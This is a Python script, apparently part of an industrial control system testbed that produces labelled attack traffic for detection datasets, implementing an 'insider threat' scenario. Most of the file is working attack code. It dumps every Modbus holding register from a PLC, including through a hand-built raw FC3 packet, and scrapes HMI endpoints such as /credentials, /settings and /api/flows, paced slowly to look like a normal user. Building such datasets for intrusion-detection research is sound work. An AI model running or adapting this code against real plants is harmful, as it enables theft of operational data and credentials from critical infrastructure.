"""
Attack #10: Insider Threat
===================================================
SCADANet stats: 1,502 packets, ip_ttl=64, Tcp_len=12 -> ~2.5 pkt/s (very slow)
Simulates an authorized user: normal traffic plus excessive data reads.
Effect: unauthorized copying of ICS data, leakage of operational information.

MITRE ATT&CK for ICS: T0852 - Screen Capture / T0882 - Theft of Operational Information
Zeek signature: conn.log -> TTL=64 (internal), high orig_bytes, long-lived connection
"""

import time
import sys
import os
import socket

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from network_attacks.net_config import (
    PLC_IP, HMI_IP, HMI_PORT, MODBUS_PORT,
    DEFAULT_NET_DURATION, LABEL_INSIDER_THREAT, NET_DURATIONS
)
try:
    from pymodbus.client import ModbusTcpClient
    HAS_PYMODBUS = True
except ImportError:
    HAS_PYMODBUS = False

ATTACK_NAME  = "Insider_Threat"
ATTACK_ID    = LABEL_INSIDER_THREAT

# SCADANet: ~2.5 pkt/s -> authorized user at normal pace but reading excessive data
READ_INTERVAL = 0.4    # seconds (2.5 pkt/s)

# Insider access: systematically read all registers (data theft)
REGISTER_BLOCKS = [
    (0, 28, "All control + sensor registers (HR0-HR27)"),
    (0, 10, "Control registers repeat"),
    (4, 24, "Sensor registers repeat"),
]

# "Sensitive" endpoints pulled from the HMI
SENSITIVE_ENDPOINTS = [
    "/api/flows",        # Entire automation logic
    "/api/nodes",        # Installed modules
    "/settings",         # System settings
    "/credentials",      # Credentials
]


def _dump_modbus_registers(ip: str, port: int) -> dict:
    """Read all registers - data theft simulation."""
    if not HAS_PYMODBUS:
        # Fallback: raw Modbus packet
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((ip, port))
            # FC3: read 28 registers
            req = b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x1c'
            s.sendall(req)
            resp = s.recv(128)
            s.close()
            return {"registers": len(resp), "ok": True}
        except Exception:
            return {"ok": False}

    client = ModbusTcpClient(ip, port=port)
    client.connect()
    stolen_data = {}
    for start, count, desc in REGISTER_BLOCKS:
        result = client.read_holding_registers(address=start, count=count)
        if not result.isError():
            stolen_data[desc] = list(result.registers)
    client.close()
    return {"stolen": stolen_data, "ok": True}


def _scrape_hmi(ip: str, port: int, endpoint: str) -> int:
    """Pull sensitive data from the HMI."""
    req = (
        f"GET {endpoint} HTTP/1.1\r\n"
        f"Host: {ip}:{port}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        f"Accept: application/json\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((ip, port))
        s.sendall(req)
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 102400:   # 100KB limit
                break
        s.close()
        return len(data)
    except Exception:
        return 0


def run_attack(duration_sec=None, label_manager=None, target_ip=None):
    if duration_sec is None:
        duration_sec = NET_DURATIONS.get("insider_threat", DEFAULT_NET_DURATION)
    if target_ip is None:
        target_ip = PLC_IP

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {target_ip} (PLC + HMI)")
    print(f"  Scenario: authorized personnel -> unauthorized data collection")
    print(f"  Rate: ~2.5 pkt/s (mimics a normal user)")
    print(f"  Duration: {duration_sec}s")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"Insider data exfil -> PLC={target_ip}, HMI={HMI_IP}:{HMI_PORT}"
        )

    start_time   = time.time()
    req_count    = 0
    total_stolen = 0
    cycle        = 0

    try:
        while (time.time() - start_time) < duration_sec:
            cycle += 1

            # 1. Modbus register dump (data theft)
            r = _dump_modbus_registers(target_ip, MODBUS_PORT)
            req_count += 1
            if r.get("ok"):
                total_stolen += r.get("registers", 56)  # 28 regs x 2 bytes

            time.sleep(READ_INTERVAL)

            # 2. HMI endpoint scraping
            if (time.time() - start_time) < duration_sec:
                ep = SENSITIVE_ENDPOINTS[cycle % len(SENSITIVE_ENDPOINTS)]
                bytes_got = _scrape_hmi(HMI_IP, HMI_PORT, ep)
                total_stolen += bytes_got
                req_count    += 1

            if cycle % 10 == 0:
                elapsed = time.time() - start_time
                rem     = duration_sec - elapsed
                print(f"  [INSD] {req_count} requests | "
                      f"{total_stolen/1024:.1f} KB stolen | remaining: {rem:.0f}s")

            time.sleep(READ_INTERVAL)

    except KeyboardInterrupt:
        print("\n  [INSD] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{req_count} requests, {total_stolen/1024:.1f}KB stolen, {elapsed:.1f}s"
            )
        print(f"\n  [INSD] {req_count} requests | {total_stolen/1024:.1f} KB | {elapsed:.1f}s")
    return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
